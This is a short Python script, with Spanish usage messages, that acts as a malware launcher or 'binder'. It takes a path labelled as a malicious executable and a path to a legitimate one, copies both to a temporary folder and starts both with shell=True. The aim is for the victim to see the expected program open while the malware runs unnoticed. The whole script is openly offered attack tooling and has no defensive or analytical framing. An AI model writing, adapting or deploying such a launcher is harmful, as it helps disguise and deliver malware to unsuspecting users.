import sys
import os
import shutil
import tempfile
import subprocess

def main():
    if len(sys.argv) != 3:
        print("Uso: launcher.exe <archivo_malicioso.exe> <archivo_legitimo.exe>")
        sys.exit(1)

    mal_path = sys.argv[1]
    legit_path = sys.argv[2]

    if not os.path.isfile(mal_path) or not os.path.isfile(legit_path):
        print("Uno o ambos archivos no existen.")
        sys.exit(1)

    temp_dir = tempfile.mkdtemp()

    mal_copy = os.path.join(temp_dir, os.path.basename(mal_path))
    legit_copy = os.path.join(temp_dir, os.path.basename(legit_path))

    shutil.copy2(mal_path, mal_copy)
    shutil.copy2(legit_path, legit_copy)

    subprocess.Popen(mal_copy, shell=True)
    subprocess.Popen(legit_copy, shell=True)

if __name__ == "__main__":
    main()
